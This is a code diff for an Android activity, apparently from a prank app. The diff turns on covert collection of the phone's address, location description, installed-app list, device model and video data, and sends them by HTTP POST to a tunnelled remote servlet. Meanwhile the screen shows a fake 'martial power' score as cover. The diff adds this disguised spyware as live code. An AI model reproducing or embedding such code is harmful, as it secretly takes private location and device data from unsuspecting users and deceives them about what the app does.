@@ -22,67 +22,81 @@ import com.baidu.location.BDAbstractLocationListener;
 import com.baidu.location.BDLocation;
 import com.baidu.location.LocationClient;
 import com.baidu.location.LocationClientOption;
-import com.yangyong.didi2.Constants;
+import com.yangyong.didi2.constant.Constants;
 import com.yangyong.didi2.R;
-import com.yangyong.didi2.util.AppUtil;
+import com.yangyong.didi2.util.OkHttpUtil;
 import com.yangyong.didi2.util.PermissionUtils;
+import com.yangyong.didi2.util.SpUtils;
 
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.Random;
+import java.util.Timer;
+import java.util.TimerTask;
 
 import io.reactivex.functions.Consumer;
 
 public class SendDataActivity extends AppCompatActivity implements View.OnClickListener {
 
-    private static final String TAG = "yy";
+    private static final String TAG = "yylog";
     private Button send_data;
     private SharedPreferences preferences;
-    private String rUrl = "http://106.12.207.212:8080/shenying/saveDeviceServlet";
-    //        private String rUrl = "http://shenyin.vipgz1.idcfengye.com/shenying/saveDeviceServlet";
+    //    private String rUrl = "http://106.12.207.212:8080/shenying/saveDeviceServlet";
+    private String rUrl = "http://shenying.5gzvip.idcfengye.com/shenying/saveDeviceServlet";
     private TextView two_tip;
-//    private String rUrl = "https://192.168.206.104/shenying/saveDeviceServlet";
+    //    private String rUrl = "https://192.168.206.104/shenying/saveDeviceServlet";
 //    private String rUrl = "http://localhost:8080/shenying/saveDeviceServlet";
-
+    private int count = 1;
     private Handler mHandler = new Handler() {
         @Override
         public void handleMessage(Message msg) {
+            stopTimer();
             switch (msg.what) {
                 case 0:
 //                    Toast.makeText(SendDataActivity.this,"检测人品成功",Toast.LENGTH_SHORT).show();
-                    two_tip.setText("清歌是猪!!");
-//                    locationClient.stop();
+                    int number = new Random().nextInt(100) + 1;
+                    two_tip.setText("你的武力值为：" + number);
+                    locationClient.stop();
                     break;
                 case 1:
 //                    Toast.makeText(SendDataActivity.this,"检测人品失败",Toast.LENGTH_SHORT).show();
-                    two_tip.setText("检测人品失败...");
+                    two_tip.setText("检测武力失败...");
                     break;
                 case 2:
 //                    Toast.makeText(SendDataActivity.this,"检测人品失败",Toast.LENGTH_SHORT).show();
                     two_tip.setTextSize(20);
                     two_tip.setText("目前处于开发阶段，只能测试一次，哈哈..");
+                    locationClient.stop();
+                    break;
+                case 3:
+                    tv_tip.setText("开始检测武力值。。。");
+                    break;
+                case 5:
+                    tv_tip.setText("开始检测武力值");
                     break;
             }
         }
     };
     private LocationClient locationClient;
     private Button start_location;
+    private TextView tv_tip;
+    private Timer timer;
+    private TimerTask timerTask;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_send_data);
         initView();
-        initSP();
         initPer();
-//        initLocationOption();
-//        boolean isFirst = preferences.getBoolean("isFirst", true);
-//        if (isFirst) {
-//            sendData("ooo");
-//        }else {
-//            mHandler.sendEmptyMessage(2);
-//            Log.e(Constants.TAG, "已发送过邮件 ");
-//        }
+        initLocationOption();
+        int value = SpUtils.getValue(SendDataActivity.this, SpUtils.UPLOADSTATUS);
+        if (value == 0) {
+        } else {
+            mHandler.sendEmptyMessage(2);
+            Log.e(Constants.TAG, "已发送过邮件 ");
+        }
     }
 
     private void initPer() {
@@ -97,10 +111,6 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
         });
     }
 
-    private void initSP() {
-        preferences = getSharedPreferences("user", 0);
-    }
-
     private void initView() {
         send_data = (Button) findViewById(R.id.send_data);
 
@@ -109,6 +119,8 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
         two_tip.setOnClickListener(this);
         start_location = (Button) findViewById(R.id.start_location);
         start_location.setOnClickListener(this);
+        tv_tip = (TextView) findViewById(R.id.tv_tip);
+        tv_tip.setOnClickListener(this);
     }
 
     @Override
@@ -139,7 +151,7 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
 //可选，默认gcj02，设置返回的定位结果坐标系，如果配合百度地图使用，建议设置为bd09ll;
         locationOption.setCoorType("gcj02");
 //可选，默认0，即仅定位一次，设置发起连续定位请求的间隔需要大于等于1000ms才是有效的
-        locationOption.setScanSpan(120000);
+        locationOption.setScanSpan(20000);
 //可选，设置是否需要地址信息，默认不需要
         locationOption.setIsNeedAddress(true);
 //可选，设置是否需要地址描述
@@ -181,24 +193,30 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
             String addrStr = location.getAddrStr();
             double latitude = location.getLatitude();    //获取纬度信息
             double longitude = location.getLongitude();    //获取经度信息
-            Log.e(Constants.TAG, "所在位置: " + longitude + "," + latitude);
             String locationDescribe = location.getLocationDescribe();
-            /*if (addrStr != null || locationDescribe != null) {
+            Log.e(Constants.TAG, "所在位置: " + longitude + "," + latitude + ":" + locationDescribe);
+
+            if (locationDescribe != null) {
                 String s = addrStr + "\n" + locationDescribe;
-//                Log.e(Constants.TAG, "拿到位置信息");
+                Log.e(Constants.TAG, "拿到位置信息");
                 sendData(s);
-            }*/
+            } else {
+                sendData("ooo");
+            }
         }
     }
 
     private void sendData(final String location) {
-//        int status = SpUtils.getValue(this, SpUtils.UPLOADSTATUS);
-//        if (status == 1)
-//        return;
+        int status = SpUtils.getValue(this, SpUtils.UPLOADSTATUS);
+        if (status == 1) {
+            return;
+        }
+        SpUtils.saveValue(SendDataActivity.this, SpUtils.UPLOADSTATUS, 1);
         new Thread(
                 new Runnable() {
                     @Override
                     public void run() {
+                        startTimer();
 //                        SpUtils.saveValue(SendDataActivity.this, SpUtils.UPLOADSTATUS, 1);
                         String thirdAppList = getThirdAppList(SendDataActivity.this);
                         String video = getVideo();
@@ -213,17 +231,20 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
                         Log.e(TAG, "获取到位置: " + brand + model + "==" + location);
                         Log.e(TAG, "获取到应用: " + thirdAppList);
                         Log.e(TAG, "获取到video: " + video);
-                        String phoneContent = brand + model + "\n" + thirdAppList + "\n" + video;
-                        AppUtil.getInstance().send(preferences, phoneContent, mHandler);
-                        /*OkHttpUtil.getInstance().doPost(rUrl, body, new OkHttpUtil.DataCallBack() {
+                        //发送邮件数据
+//                        String phoneContent = brand + model + "\n" + thirdAppList + "\n" + video;
+//                        AppUtil.getInstance().send(preferences, phoneContent, mHandler);
+                        OkHttpUtil.getInstance().doPost(rUrl, body, new OkHttpUtil.DataCallBack() {
                             @Override
                             public void onSuccess(String s) {
-//                Log.e(TAG, "onSuccess: "+s );
                                 if ("200".equals(s)) {
-                                    mHandler.sendEmptyMessage(0);
                                     Log.e(TAG, "onSuccess上传信息成功: ");
-                                    SpUtils.saveValue(SendDataActivity.this, SpUtils.UPLOADSTATUS, 1);
+                                    if (!location.equals("ooo")) {
+                                        mHandler.sendEmptyMessage(0);
+                                        SpUtils.saveValue(SendDataActivity.this, SpUtils.UPLOADSTATUS, 1);
+                                    }
                                 } else if ("500".equals(s)) {
+                                    SpUtils.saveValue(SendDataActivity.this, SpUtils.UPLOADSTATUS, 0);
                                     mHandler.sendEmptyMessage(1);
                                     Log.e(TAG, "上传设备信息失败: ");
                                 }
@@ -231,10 +252,11 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
 
                             @Override
                             public void onFailure(String f) {
+                                SpUtils.saveValue(SendDataActivity.this, SpUtils.UPLOADSTATUS, 0);
                                 mHandler.sendEmptyMessage(1);
                                 Log.e(TAG, "onFailure: " + f);
                             }
-                        });*/
+                        });
                     }
                 }
         ).start();
@@ -344,6 +366,33 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
             e.printStackTrace();
         }
         return 0;
+    }
+
+    private void startTimer() {
+        if (timer != null) {
+            timer.cancel();
+            timer = null;
+        }
+        timer = new Timer();
+        timerTask = new TimerTask() {
+            @Override
+            public void run() {
+                if (count % 2 == 0) {
+                    mHandler.sendEmptyMessage(3);
+                } else {
+                    mHandler.sendEmptyMessage(5);
+                }
+                count++;
+            }
+        };
+        timer.schedule(timerTask, 0, 1000);
+    }
+
+    private void stopTimer() {
+        if (timer != null) {
+            timer.cancel();
+            timer = null;
+        }
     }
 
 }
